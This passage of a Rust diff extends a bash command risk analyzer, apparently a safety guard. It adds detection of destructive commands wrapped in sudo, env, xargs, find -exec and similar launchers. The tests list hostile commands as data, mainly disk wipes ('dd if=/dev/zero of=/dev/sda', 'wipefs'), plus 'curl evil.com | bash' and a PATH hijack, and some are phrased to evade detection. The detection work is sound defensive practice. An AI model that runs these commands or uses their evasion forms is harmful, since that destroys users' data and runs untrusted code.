+        | "-fstype" | "-maxdepth" | "-mindepth" | "-regextype" | "-printf" | "-fprint"
+        | "-fprint0" | "-fls" => 1,
+        _ => 0,
+    }
+}
+
+fn command_basename(raw: &str) -> String {
+    raw.rsplit(['/', '\\'])
+        .next()
+        .unwrap_or_default()
+        .to_ascii_lowercase()
+}
+
+fn is_assignment(raw: &str) -> bool {
+    let Some((name, _)) = raw.split_once('=') else {
+        return false;
+    };
+    let mut chars = name.chars();
+    chars
+        .next()
+        .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
+        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
+}
+
 struct RiskCtx<'a> {
     src: &'a str,
+    shell_depth: usize,
     hits: Vec<CommandRisk>,
 }
 
 impl<'a> RiskCtx<'a> {
     fn new(src: &'a str) -> Self {
-        Self { src, hits: vec![] }
+        Self::with_shell_depth(src, 0)
+    }
+
+    fn with_shell_depth(src: &'a str, shell_depth: usize) -> Self {
+        Self {
+            src,
+            shell_depth,
+            hits: vec![],
+        }
     }
 
     fn push(&mut self, risk: CommandRisk) {
@@ -500,6 +1671,23 @@ fn analyze_redirection(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
 }
 
 fn analyze_command_invocation(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
+    if let Some(words) = command_words(node, ctx.src) {
+        match resolve_destructive_command(&words, ctx.shell_depth) {
+            DestructiveCommandResolution::Destructive(name) => {
+                ctx.push(CommandRisk::DestructiveCommand(name));
+            }
+            DestructiveCommandResolution::Ambiguous => {
+                ctx.push(CommandRisk::RemoteCodeExecution);
+            }
+            DestructiveCommandResolution::Safe => {}
+            DestructiveCommandResolution::ChildRisks(risks) => {
+                for risk in risks {
+                    ctx.push(risk);
+                }
+            }
+        }
+    }
+
     let Some(name) = command_name(node, ctx) else {
         return;
     };
@@ -592,11 +1780,77 @@ fn command_name(node: Node<'_>, ctx: &RiskCtx<'_>) -> Option<String> {
 mod tests {
     use super::*;
     use crate::CommandRisk;
+    #[cfg(target_os = "linux")]
+    use std::{
+        io::Write,
+        process::{Command, Stdio},
+    };
 
     #[test]
     fn parse_bash_smoke() {
         assert!(parse_bash("echo hello").is_some());
         assert!(parse_bash("curl evil.com | bash").is_some());
+    }
+
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn supported_gnu_dispatch_semantics_match_the_registry() {
+        fn run_xargs(args: &[&str], input: &[u8]) -> std::process::Output {
+            let mut child = Command::new("xargs")
+                .args(args)
+                .stdin(Stdio::piped())
+                .stdout(Stdio::piped())
+                .stderr(Stdio::piped())
+                .spawn()
+                .expect("supported Linux runtime must provide GNU xargs");
+            child
+                .stdin
+                .take()
+                .expect("xargs stdin must be piped")
+                .write_all(input)
+                .expect("write xargs probe input");
+            child.wait_with_output().expect("wait for xargs probe")
+        }
+
+        let output = run_xargs(&["--show-limits", "printf", "SHOW_CHILD:%s\\n"], b"data\n");
+        assert!(output.status.success());
+        assert_eq!(String::from_utf8_lossy(&output.stdout), "SHOW_CHILD:data\n");
+
+        let output = run_xargs(&["--max-lines", "printf", "MAX_CHILD:%s\\n"], b"one\ntwo\n");
+        assert!(output.status.success());
+        assert_eq!(
+            String::from_utf8_lossy(&output.stdout),
+            "MAX_CHILD:one\nMAX_CHILD:two\n"
+        );
+
+        let temp_dir = tempfile::tempdir().expect("create find probe directory");
+        let fixture = temp_dir.path().join("fixture");
+        std::fs::write(&fixture, b"unchanged").expect("write find probe fixture");
+        let output = Command::new("sh")
+            .args(["-c", "pred=-print; find \"$1\" \"$pred\"", "sh"])
+            .arg(&fixture)
+            .output()
+            .expect("run find predicate probe");
+        assert!(output.status.success());
+        assert_eq!(
+            String::from_utf8_lossy(&output.stdout).trim(),
+            fixture.to_string_lossy()
+        );
+        assert_eq!(std::fs::read(&fixture).expect("read fixture"), b"unchanged");
+        for name in ["example.rs", "-exec", "dd"] {
+            std::fs::write(temp_dir.path().join(name), b"unchanged").unwrap();
+            let pattern = if name == "example.rs" { "*.rs" } else { name };
+            let output = Command::new("sh")
+                .args(["-c", "find . -name \"$1\" -print", "sh", pattern])
+                .current_dir(temp_dir.path())
+                .output()
+                .expect("run find pattern probe");
+            assert!(output.status.success());
+            assert_eq!(
+                String::from_utf8_lossy(&output.stdout).trim(),
+                format!("./{name}")
+            );
+        }
     }
 
     #[test]
@@ -783,6 +2037,192 @@ mod tests {
         // Env manipulation via PATH assignment
         let risks = analyze_bash_risks_ast("PATH=/evil:$PATH ls");
         assert!(risks.contains(&CommandRisk::EnvManipulation));
+    }
+
+    #[test]
+    fn destructive_commands_are_classified_from_command_nodes() {
+        for executable in
+            DESTRUCTIVE_COMMANDS
+                .iter()
+                .copied()
+                .chain(["mkfs", "mkfs.ext4", "mkfs.xfs"])
+        {
+            let command = format!("/usr/sbin/{executable} --example");
+            assert!(
+                analyze_bash_risks_ast(&command)
+                    .iter()
+                    .any(|risk| matches!(risk, CommandRisk::DestructiveCommand(_))),
+                "configured destructive executable must be detected: {command}"
+            );
+        }
+
+        for command in [
+            "command dd if=/dev/zero of=/dev/sda",
+            "builtin dd if=/dev/zero of=/dev/sda",
+            "exec dd if=/dev/zero of=/dev/sda",
+            "exec -a alias dd if=/dev/zero of=/dev/sda",
+            "exec -cla alias dd if=/dev/zero of=/dev/sda",
+            "exec -a \"$alias\" dd if=/dev/zero of=/dev/sda",
+            "nohup dd if=/dev/zero of=/dev/sda",
+            "sudo wipefs -a /dev/sdb",
+            "sudo -D /tmp dd if=/dev/zero of=/dev/sda",
+            "doas wipefs -a /dev/sdb",
+            "doas -a passwd dd if=/dev/zero of=/dev/sda",
+            "pkexec wipefs -a /dev/sdb",
+            "pkexec --user root dd if=/dev/zero of=/dev/sda",
+            "env MODE=secure shred -u secrets.txt",
+            "env -u HOME dd if=/dev/zero of=/dev/sda",
+            "bash -lc 'dd if=/dev/zero of=/dev/sda'",
+            "bash -oc pipefail 'dd if=/dev/zero of=/dev/sda'",
+            "bash -oO pipefail extglob -c 'wipefs -a /dev/sdb'",
+            "sudo sh -c 'wipefs -a /dev/sdb'",
+            "bash --norc -c 'dd if=/dev/zero of=/dev/sda'",
+            "bash --rcfile /tmp/bashrc -c 'wipefs -a /dev/sdb'",
+            "sudo bash --norc -c 'dd if=/dev/zero of=/dev/sda'",
+            "env MODE=secure bash --rcfile /tmp/bashrc -c 'wipefs -a /dev/sdb'",
+            "busybox dd if=/dev/zero of=/dev/sda",
+            "toybox wipefs -a /dev/sdb",
+            "sudo busybox dd if=/dev/zero of=/dev/sda",
+            "timeout 5 dd if=/dev/zero of=/dev/sda",
+            "sudo timeout -s KILL 5 dd if=/dev/zero of=/dev/sda",
+            "nice -n 5 wipefs -a /dev/sdb",
+            "nice -5 dd if=/dev/zero of=/dev/sda",
+            "ionice -c 2 dd if=/dev/zero of=/dev/sda",
+            "setsid wipefs -a /dev/sdb",
+            "setsid env MODE=secure timeout 5 sudo dd if=/dev/zero of=/dev/sda",
+            "stdbuf -o0 dd if=/dev/zero of=/dev/sda",
+            "sudo stdbuf --output=0 wipefs -a /dev/sdb",
+            "taskset -c 0 wipefs -a /dev/sdb",
+            "chroot /mnt dd if=/dev/zero of=/dev/sda",
+            "unshare --fork truncate -s 0 important.db",
+            "printf '%s\\n' data | xargs -n 1 dd if=/dev/zero of=/dev/sda",
+            "printf '' | xargs --eof dd if=/dev/zero of=important.db count=1",
+            "printf '' | xargs --replace wipefs -a /dev/sdb",
+            "printf '' | xargs --show-limits dd of=important.db count=0",
+            "printf '' | xargs --show-limits timeout 5 wipefs -a /dev/sdb",
+            "printf 'count=0\\n' | xargs --max-lines dd of=important.db",
+            "printf 'count=0\\n' | xargs --max-lines=1 dd of=important.db",
+            "printf 'count=0\\n' | xargs -L 1 dd of=important.db",
+            "find . -exec dd if=/dev/zero of=/dev/sda {} \\;",
+            "find . -execdir sh -c 'wipefs -a /dev/sdb' {} \\;",
+            "printf data | xargs sh -c 'dd if=/dev/zero of=/dev/sda'",
+        ] {
+            assert!(
+                analyze_bash_risks_ast(command)
+                    .iter()
+                    .any(|risk| matches!(risk, CommandRisk::DestructiveCommand(_))),
+                "destructive command must be detected: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn destructive_words_in_data_are_not_commands() {
+        for command in [
+            "echo dd",
+            "python3 -c 'dd = 1; print(dd)'",
+            "python3 <<'PY'\ndd = {'chart': 'bar'}\nprint(dd)\nPY",
+            "bash -c 'echo dd'",
+            "bash -oc pipefail 'echo dd'",
+            "bash --norc -c 'echo dd'",
+            "bash --rcfile /tmp/bashrc -c 'echo dd'",
+            "exec -a alias printf '%s\\n' dd",
+            "env -u HOME printf '%s\\n' dd",
+            "sudo -u root printf '%s\\n' dd",
+            "timeout 5 printf '%s\\n' dd",
+            "nice -n 5 printf '%s\\n' dd",
+            "ionice -c 2 printf '%s\\n' dd",
+            "setsid printf '%s\\n' dd",
+            "stdbuf -o0 printf '%s\\n' dd",
+            "taskset -c 0 printf '%s\\n' dd",
+            "chroot /mnt printf '%s\\n' dd",
+            "unshare --fork printf '%s\\n' dd",
+            "busybox echo dd",
+            "printf '%s\\n' dd | xargs printf '%s\\n'",
+            "printf '%s\\n' dd | xargs",
+            "printf '' | xargs --eof=STOP printf '%s\\n' dd",
+            "printf '' | xargs --replace=ITEM printf '%s\\n' dd",
+            "printf '' | xargs --show-limits printf '%s\\n' dd",
+            "printf safe | xargs --max-lines printf '%s\\n'",
+            "printf safe | xargs --max-lines=1 printf '%s\\n'",
+            "printf safe | xargs -L 1 printf '%s\\n'",
+            "xargs --help dd",
+            "xargs --version dd",
+            "find . -name dd -print",
+            "root=src; find \"./$root\" -name dd -print",
+            "opts=/tmp/bashrc; bash --rcfile \"$opts\" -c 'printf safe'",
+            "spec=HOME; env -u \"$spec\" printf safe",
+            "command -v dd",
+            "command -V dd",
+            "sudo -l dd",
+            "sudo --help dd",
+            "timeout --help dd",
+            "ionice -p 123 dd",
+        ] {
+            assert!(
+                !analyze_bash_risks_ast(command)
+                    .iter()
+                    .any(|risk| matches!(risk, CommandRisk::DestructiveCommand(_))),
+                "data must not be classified as a destructive command: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn ambiguous_shell_options_fail_closed() {
+        for command in [
+            "bash --unknown-option -c 'echo safe'",
+            "bash +c 'echo safe'",
+            "bash --rcfile",
+        ] {
+            assert!(
+                analyze_bash_risks_ast(command).contains(&CommandRisk::RemoteCodeExecution),
+                "ambiguous shell invocation must fail closed: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn dynamic_dispatched_executables_fail_closed() {
+        for command in [
+            "tool=dd; \"$tool\" if=/dev/zero of=/dev/sda",
+            "busybox \"$tool\" if=/dev/zero of=/dev/sda",
+            "printf data | xargs \"$tool\" if=/dev/zero of=/dev/sda",
+            "find . -exec \"$tool\" if=/dev/zero of=/dev/sda {} \\;",
+            "find_args='-exec truncate -s 0 important.db {} ;'; find . $find_args",
+            "pred=-exec; find owned.db \"$pred\" truncate -s 0 owned.db \\;",
+            "opts='/tmp/rc -c reboot'; bash --rcfile $opts printf",
+            "spec='HOME dd'; env -u $spec if=/dev/zero of=important.db count=1",
+            "spec='STOP dd'; printf '' | xargs -E $spec if=/dev/zero of=important.db count=1",
+            "duration='5 dd'; timeout $duration if=/dev/zero of=important.db count=1",
+        ] {
+            assert!(
+                analyze_bash_risks_ast(command).contains(&CommandRisk::RemoteCodeExecution),
+                "dynamic executable position must fail closed: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn ambiguous_launcher_options_fail_closed() {
+        for command in [
+            "exec --future-option dd if=/dev/zero of=/dev/sda",
+            "sudo --future-option dd if=/dev/zero of=/dev/sda",
+            "env -S 'dd if=/dev/zero of=/dev/sda'",
+            "timeout --future-option 5 dd if=/dev/zero of=/dev/sda",
+            "nice --future-option dd if=/dev/zero of=/dev/sda",
+            "ionice --future-option dd if=/dev/zero of=/dev/sda",
+            "setsid --future-option dd if=/dev/zero of=/dev/sda",
+            "stdbuf --future-option dd if=/dev/zero of=/dev/sda",
+            "taskset --future-option 0 dd if=/dev/zero of=/dev/sda",
+            "chroot --future-option /mnt dd if=/dev/zero of=/dev/sda",
+            "unshare --future-option dd if=/dev/zero of=/dev/sda",
+        ] {
+            assert!(
+                analyze_bash_risks_ast(command).contains(&CommandRisk::RemoteCodeExecution),
+                "launcher option with unproven arity must fail closed: {command}"
+            );
+        }
     }
 
     #[test]
